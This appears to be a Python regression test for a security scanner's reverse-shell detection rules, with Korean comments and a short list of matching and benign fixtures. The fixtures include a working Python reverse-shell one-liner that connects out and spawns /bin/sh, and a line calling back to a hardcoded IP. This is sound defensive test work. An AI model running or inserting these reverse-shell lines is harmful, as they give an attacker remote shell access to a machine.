#!/usr/bin/env python3
"""skillscan 신규 리버스셸 룰 회귀 테스트 (2026-07-19).

C-PYREVSHELL·C-SHELL-CALLBACK-IP 두 룰이 계속 동작하는지 고정.
케이스는 MalSkillBench 실샘플(TP)+정상패턴(TN)에서 박제.
.py라 integrity-guard CODE_DIRS 자동 감시 대상 → 픽스처 변조도 적발.

실행:  python3 test_revshell_rules.py   (exit 0=통과, 1=회귀)
"""
import re, sys, os

# skillscan.py에서 룰 정규식을 직접 로드(중복정의 방지 — 룰이 바뀌면 여기도 따라감)
HERE = os.path.dirname(os.path.abspath(__file__))
src = open(os.path.join(HERE, "skillscan.py")).read()

def rule_pattern(rid):
    # CODE_RULES 튜플에서 rid의 정규식(2번째 요소) 추출
    m = re.search(r'\("' + re.escape(rid) + r'",\s*r"((?:[^"\\]|\\.)*)"', src)
    if not m:
        print(f"FAIL: 룰 {rid} 를 skillscan.py에서 못 찾음 (삭제/개명됨?)")
        sys.exit(1)
    return re.compile(m.group(1))

CASES = [
    # (rule, text, expect_hit, src)
    ("C-PYREVSHELL",
     "import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")",
     True, "MalSkillBench 계열"),
    ("C-PYREVSHELL",
     "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(host)\n    os.dup2(s.fileno(), 0)",
     True, "dup2 fileno"),
    ("C-SHELL-CALLBACK-IP",
     "s.connect(('134.209.85.64', 4444))  # backup_port",
     True, "하드코딩 IP+콜백포트"),
    # TN — 정상: 오탐 나면 안 됨
    ("C-PYREVSHELL",
     "result = socket.socket(); result.connect(('api.internal', 443))",
     False, "정상 API 소켓"),
    ("C-SHELL-CALLBACK-IP",
     "server.listen(8080)  # dev server port",
     False, "정상 dev 포트"),
]

def main():
    pats = {}
    for rid in {c[0] for c in CASES}:
        pats[rid] = rule_pattern(rid)
    failed = 0
    for rid, text, expect, note in CASES:
        hit = bool(pats[rid].search(text))
        ok = hit == expect
        if not ok:
            failed += 1
            print(f"[FAIL] {rid}: hit={hit} expect={expect} :: {note} :: {text[:50]!r}")
        else:
            print(f"[OK]   {rid}: {note}")
    print(f"\n{len(CASES)-failed}/{len(CASES)} 통과")
    sys.exit(1 if failed else 0)

if __name__ == "__main__":
    main()
